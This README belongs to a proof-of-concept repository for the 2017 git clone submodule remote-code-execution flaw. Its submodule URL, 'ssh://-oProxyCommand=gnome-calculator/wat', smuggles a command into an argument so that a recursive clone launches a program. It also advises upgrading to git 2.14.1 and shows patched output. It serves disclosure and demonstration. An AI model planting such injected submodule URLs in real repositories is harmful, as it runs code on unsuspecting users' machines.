# Git clone RCE

This repo is an example of `git clone` vulnerability described in http://blog.recurity-labs.com/2017-08-10/scm-vulns using a git submodule.

To see it in action, simply clone the repo using:
```
git clone git@github.com:disconnect3d/git_clone_rce_calc.git --recursive
```
The recursive part is crucial as git **must** try to clone the malicious git submodule url.
This will launch a `gnome-terminal` on your machine.

### To be safe
**Upgrade your Git to 2.14.1 as that is fixed on that version as stated in [git's release notes](https://raw.githubusercontent.com/git/git/master/Documentation/RelNotes/2.14.1.txt).**

After updating the issue is gone:
```
$ git clone git@github.com:disconnect3d/git_clone_rce_calc.git --recursive
Cloning into 'git_clone_rce_calc'...
remote: Counting objects: 15, done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 15 (delta 3), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.
Resolving deltas: 100% (3/3), done.
Checking connectivity... done.
Submodule 'git_calc_rce' (ssh://-oProxyCommand=gnome-calculator/wat) registered for path 'git_calc_rce'
Cloning into 'git_calc_rce'...
fatal: strange hostname '-oProxyCommand=gnome-calculator' blocked
fatal: clone of 'ssh://-oProxyCommand=gnome-calculator/wat' into submodule path 'git_calc_rce' failed
```
